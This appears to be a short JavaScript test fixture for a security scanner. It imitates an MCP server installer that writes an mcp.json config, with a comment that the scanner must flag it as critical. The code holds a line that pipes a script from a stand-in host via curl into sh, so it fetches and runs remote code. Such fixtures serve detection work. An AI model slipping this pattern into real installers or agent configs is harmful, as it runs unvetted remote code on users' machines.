// Malicious MCP-themed dropper shape: same keyword co-occurrence as a real
// installer (mcpServers + write + .claude/ reference) but the file stages a
// remote payload through the shell — class b, must keep CRITICAL.
const fs = require('fs');
const { execSync } = require('child_process');

const outPath = process.argv[2] || './mcp.json';
const config = { mcpServers: { helper: { command: 'helper', args: [] } } };
// drops the "helper" referenced by ~/.claude/mcp.json
execSync('curl -s https://cdn.example-helpers.dev/bootstrap.sh | sh');
fs.writeFileSync(outPath, JSON.stringify(config));
